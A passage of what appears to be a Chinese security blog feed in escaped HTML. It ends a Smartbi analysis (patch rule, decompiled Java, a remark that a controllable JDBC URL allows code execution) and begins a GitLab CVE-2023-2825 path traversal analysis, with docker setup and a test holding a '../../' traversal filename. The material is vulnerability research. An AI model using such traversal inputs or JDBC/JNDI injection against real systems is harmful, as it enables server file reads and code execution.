&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;/vision/RMIServlet&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;rules&amp;#34;&lt;/span>: [{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;className&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;DataSourceService&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;methodName&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;testConnectionList&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;RejectRMIParamsStringsPatchRule&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;strings&amp;#34;&lt;/span>: [&lt;span style="color:#e6db74">&amp;#34;clientRerouteServerListJNDIName&amp;#34;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> },{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;className&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;DataSourceService&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;methodName&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;testConnection&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;RejectRMIParamsStringsPatchRule&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;strings&amp;#34;&lt;/span>: [&lt;span style="color:#e6db74">&amp;#34;clientRerouteServerListJNDIName&amp;#34;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#960050;background-color:#1e0010">,&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>该代码中的参数均为可控，故可以通过控制JDBC url的方式执行恶意代码，此时可以通过DB2执行代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">testConnectionList&lt;/span>(List&lt;span style="color:#f92672">&amp;lt;&lt;/span>IDataSource&lt;span style="color:#f92672">&amp;gt;&lt;/span> list) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (IDataSource dataSource : list) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> MetaDataServiceImpl.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">testConnection&lt;/span>(dataSource);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">testConnection&lt;/span>(IDataSource dataSource) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> preIndex;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ISystemConfig systemConfig;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DataSource ds &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> DataSource();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String url &lt;span style="color:#f92672">=&lt;/span> dataSource.&lt;span style="color:#a6e22e">getUrl&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setId&lt;/span>(UUIDGenerator.&lt;span style="color:#a6e22e">generate&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setName&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getName&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setAlias&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getAlias&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setDriver&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getDriver&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setDesc&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getDesc&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setDbCharset&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getDbCharset&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setUrl&lt;/span>(url);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setUser&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getUser&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setDriverType&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getDriverType&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setMaxConnection&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getMaxConnection&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setValidationQuery&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getValidationQuery&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setPassword&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getPassword&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setTransactionIsolation&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getTransactionIsolation&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setValidationQueryMethod&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getValidationQueryMethod&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setAuthenticationType&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getAuthenticationType&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setExtendProp&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getExtendProp&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setDriverCatalog&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getDriverCatalog&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (dataSource.&lt;span style="color:#a6e22e">getPassword&lt;/span>() &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>StringUtil.&lt;span style="color:#a6e22e">isNullOrEmpty&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getId&lt;/span>())) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DataSource dbDs &lt;span style="color:#f92672">=&lt;/span> loadDataSource(dataSource.&lt;span style="color:#a6e22e">getId&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setPassword&lt;/span>(dbDs.&lt;span style="color:#a6e22e">getPassword&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (StringUtil.&lt;span style="color:#a6e22e">isNullOrEmpty&lt;/span>(dataSource.&lt;span style="color:#a6e22e">getId&lt;/span>()) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ds.&lt;span style="color:#a6e22e">getDriverType&lt;/span>() &lt;span style="color:#f92672">==&lt;/span> DBType.&lt;span style="color:#a6e22e">HADOOP_HIVE&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (systemConfig &lt;span style="color:#f92672">=&lt;/span> FreeQueryModule.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">getSystemConfigService&lt;/span>().&lt;span style="color:#a6e22e">getSystemConfig&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;MPP_SSH_CONFIG&amp;#34;&lt;/span>)) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String longValue &lt;span style="color:#f92672">=&lt;/span> systemConfig.&lt;span style="color:#a6e22e">getLongValue&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (StringUtils.&lt;span style="color:#a6e22e">isNotBlank&lt;/span>(longValue)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSONObject jsonObject &lt;span style="color:#f92672">=&lt;/span> JSONObject.&lt;span style="color:#a6e22e">fromString&lt;/span>(longValue);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (jsonObject.&lt;span style="color:#a6e22e">has&lt;/span>(SFTPConstants.&lt;span style="color:#a6e22e">HIVE_PASSWORD&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String pwd &lt;span style="color:#f92672">=&lt;/span> jsonObject.&lt;span style="color:#a6e22e">getString&lt;/span>(SFTPConstants.&lt;span style="color:#a6e22e">HIVE_PASSWORD&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (StringUtils.&lt;span style="color:#a6e22e">isNotBlank&lt;/span>(pwd)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ds.&lt;span style="color:#a6e22e">setPassword&lt;/span>(pwd);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Connection conn &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn &lt;span style="color:#f92672">=&lt;/span> ConnectionPool.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">getConnection&lt;/span>(ds);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (conn &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SmartbiException(CommonErrorCode.&lt;span style="color:#a6e22e">JDBC_DRIVER_ERROR&lt;/span>).&lt;span style="color:#a6e22e">setDetail&lt;/span>(ds.&lt;span style="color:#a6e22e">getDriver&lt;/span>() &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> ds.&lt;span style="color:#a6e22e">getUrl&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (DBType.&lt;span style="color:#a6e22e">PRESTO&lt;/span> &lt;span style="color:#f92672">==&lt;/span> dataSource.&lt;span style="color:#a6e22e">getDriverType&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PreparedStatement stat &lt;span style="color:#f92672">=&lt;/span> JdbcUtil.&lt;span style="color:#a6e22e">prepareStatement&lt;/span>(conn, &lt;span style="color:#e6db74">&amp;#34;SELECT 1&amp;#34;&lt;/span>, dataSource.&lt;span style="color:#a6e22e">getDriverType&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PreparedStatementWarp.&lt;span style="color:#a6e22e">executeQuery&lt;/span>(stat, DBSQLUtil.&lt;span style="color:#a6e22e">createSQLLog&lt;/span>(ds.&lt;span style="color:#a6e22e">getAlias&lt;/span>(), SmartbiXDataSetUtil.&lt;span style="color:#a6e22e">OTHER&lt;/span>, FreeQueryModule.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">getStateModule&lt;/span>(), &lt;span style="color:#e6db74">&amp;#34;SELECT 1&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (Exception e) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (e &lt;span style="color:#66d9ef">instanceof&lt;/span> SmartbiException) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> ((SmartbiException) e);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SmartbiException(FreeQueryErrorCode.&lt;span style="color:#a6e22e">CONNECTION_POOL_NOT_INITIAL&lt;/span>, e).&lt;span style="color:#a6e22e">setDetail&lt;/span>(StringUtil.&lt;span style="color:#a6e22e">getLanguageValue&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;InvalidConnection&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (DBType.&lt;span style="color:#a6e22e">CLICK_HOUSE&lt;/span> &lt;span style="color:#f92672">==&lt;/span> dataSource.&lt;span style="color:#a6e22e">getDriverType&lt;/span>() &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (preIndex &lt;span style="color:#f92672">=&lt;/span> url.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;clusterName=&amp;#34;&lt;/span>)) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String clusterName &lt;span style="color:#f92672">=&lt;/span> url.&lt;span style="color:#a6e22e">substring&lt;/span>(preIndex &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;clusterName=&amp;#34;&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> suffixIndex &lt;span style="color:#f92672">=&lt;/span> clusterName.&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&amp;amp;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (suffixIndex &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> clusterName &lt;span style="color:#f92672">=&lt;/span> clusterName.&lt;span style="color:#a6e22e">substring&lt;/span>(0, suffixIndex);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>StringUtil.&lt;span style="color:#a6e22e">isNullOrEmpty&lt;/span>(clusterName)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String validSql &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;drop table if exists t_testcluster on cluster &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> clusterName;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PreparedStatement stat2 &lt;span style="color:#f92672">=&lt;/span> JdbcUtil.&lt;span style="color:#a6e22e">prepareStatement&lt;/span>(conn, validSql, dataSource.&lt;span style="color:#a6e22e">getDriverType&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PreparedStatementWarp.&lt;span style="color:#a6e22e">executeQuery&lt;/span>(stat2, DBSQLUtil.&lt;span style="color:#a6e22e">createSQLLog&lt;/span>(ds.&lt;span style="color:#a6e22e">getAlias&lt;/span>(), SmartbiXDataSetUtil.&lt;span style="color:#a6e22e">OTHER&lt;/span>, FreeQueryModule.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">getStateModule&lt;/span>(), validSql));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (Exception e2) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (e2.&lt;span style="color:#a6e22e">getLocalizedMessage&lt;/span>().&lt;span style="color:#a6e22e">indexOf&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Requested cluster &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> clusterName &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; not found&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SmartbiException(CommonErrorCode.&lt;span style="color:#a6e22e">CLICK_HOUSE_CLUSTER_NOT_FOUND&lt;/span>, e2).&lt;span style="color:#a6e22e">setDetail&lt;/span>(clusterName);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (e2 &lt;span style="color:#66d9ef">instanceof&lt;/span> SmartbiException) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> ((SmartbiException) e2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SmartbiException(FreeQueryErrorCode.&lt;span style="color:#a6e22e">CONNECTION_POOL_NOT_INITIAL&lt;/span>, e2).&lt;span style="color:#a6e22e">setDetail&lt;/span>(StringUtil.&lt;span style="color:#a6e22e">getLanguageValue&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;InvalidConnection&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (Exception e3) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (e3 &lt;span style="color:#66d9ef">instanceof&lt;/span> SmartbiException) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> ((SmartbiException) e3);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String detail &lt;span style="color:#f92672">=&lt;/span> SmartbiXDataSetUtil.&lt;span style="color:#a6e22e">OTHER&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (e3 &lt;span style="color:#66d9ef">instanceof&lt;/span> ClassNotFoundException) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> detail &lt;span style="color:#f92672">=&lt;/span> StringUtil.&lt;span style="color:#a6e22e">getLanguageValue&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;DBDriverNoFound&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SmartbiException(FreeQueryErrorCode.&lt;span style="color:#a6e22e">CONNECTION_POOL_NOT_INITIAL&lt;/span>, e3).&lt;span style="color:#a6e22e">setDetail&lt;/span>(detail &lt;span style="color:#f92672">+&lt;/span> e3.&lt;span style="color:#a6e22e">getMessage&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">finally&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (conn &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn.&lt;span style="color:#a6e22e">close&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (Throwable th) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Logger.&lt;span style="color:#a6e22e">getLogger&lt;/span>(getClass()).&lt;span style="color:#a6e22e">debug&lt;/span>(SmartbiXDataSetUtil.&lt;span style="color:#a6e22e">OTHER&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>ds.&lt;span style="color:#a6e22e">getUrl&lt;/span>().&lt;span style="color:#a6e22e">startsWith&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;JNDI:&amp;#34;&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ConnectionPool.&lt;span style="color:#a6e22e">getInstance&lt;/span>().&lt;span style="color:#a6e22e">closePool&lt;/span>(ds);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>题外话，我本身不懂Java那一套，只是按照粗浅的代码理解去分析漏洞，有机会去分析一下JNDI注入原理。&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://www.smartbi.com.cn/patchinfo" target="_blank">https://www.smartbi.com.cn/patchinfo&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-06-16T16:07:41+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-2825 Gitlab 路径穿越漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/</link><pubDate>Fri, 26 May 2023 10:36:20 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>在GitLab 中，当一个附件存在于一个项目中，并且该项目在嵌套了至少五层的组内，攻击者才可以利用这个漏洞进行目录穿越，读取服务器上的文件。&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;p>GitLab 16.0.0&lt;/p>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;p>用docker起环境&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>docker pull gitlab/gitlab-ce:16.0.0-ce.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker run -d -p 443:443 -p 80:80 -p 222:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:16.0.0-ce.0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>一开始以为是普通的目录穿越，先diff看怎么修的，注意到16.0.1新增了&lt;code>spec\support\shared_examples\requests\uploads_actions_shared_examples.rb&lt;/code> 文件。&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-2825-gitlab-path-traversal.zh-cn.assets/1.png" />&lt;/p>
&lt;p>根据该文件内容判断应该是这个漏洞的单元测试文件，没学过ruby，先把这段代码扔给ChatGPT看看&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># frozen_string_literal: true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>RSpec.shared_examples &lt;span style="color:#e6db74">&amp;#39;uploads actions&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> describe &lt;span style="color:#e6db74">&amp;#34;GET #show&amp;#34;&lt;/span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> context &lt;span style="color:#e6db74">&amp;#39;with file traversal in filename parameter&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Uploads in tests are stored in directories like:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> let&lt;span style="color:#f92672">(&lt;/span>:filename&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#e6db74">&amp;#34;../../../../../../../../../Gemfile.lock&amp;#34;&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> let&lt;span style="color:#f92672">(&lt;/span>:escaped_filename&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> CGI.escape filename &lt;span style="color:#f92672">}&lt;/span>
